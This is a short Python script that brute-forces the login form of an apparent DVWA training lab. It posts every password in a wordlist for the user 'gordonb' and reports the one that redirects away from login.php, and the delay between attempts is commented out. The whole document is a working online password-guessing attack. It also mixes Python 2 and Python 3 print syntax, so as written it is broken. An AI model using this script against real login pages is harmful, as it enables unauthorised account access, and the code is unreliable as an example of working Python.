#!/usr/bin/env python
# coding: utf-8

import requests
import time

lines = tuple(open("mdp.txt", 'r'))


for line in lines:
    password = line.replace("\n", "")

    print("Password test:", password)

    r = requests.post('http://dvwa.com/login.php', data = {'username':'gordonb', 'password': password, 'Login': 'login'})

    if r.history:
        for resp in r.history:
            if r.url != "http://dvwa.com/login.php":
                print("The password is :", password)
                raise SystemExit(0)
    else:
        print "ERROR"

    #time.sleep(1)
